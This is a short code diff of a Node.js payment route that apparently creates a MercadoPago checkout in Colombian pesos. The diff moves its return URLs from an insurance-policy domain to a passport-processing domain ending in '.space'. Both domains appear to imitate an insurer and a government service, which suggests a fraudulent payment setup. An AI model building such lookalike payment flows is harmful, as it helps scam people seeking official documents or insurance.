@@ -26,9 +26,9 @@ app.post("/create_preference", async (req, res) => {
         currency_id: "COP"
       }],
       back_urls: {
-        success: "https://polizasonline.online/sura/",
-        failure: "https://polizasonline.online/sura/",
-        pending: "https://polizasonline.online/sura/"
+        success: "https://tramitepasaportegov.space/pasaporte/pasaporte/index.html",
+        failure: "https://tramitepasaportegov.space/pasaporte/pasaporte/index.html",
+        pending: "https://tramitepasaportegov.space/pasaporte/pasaporte/index.html"
       },
       auto_return: "approved"
     };
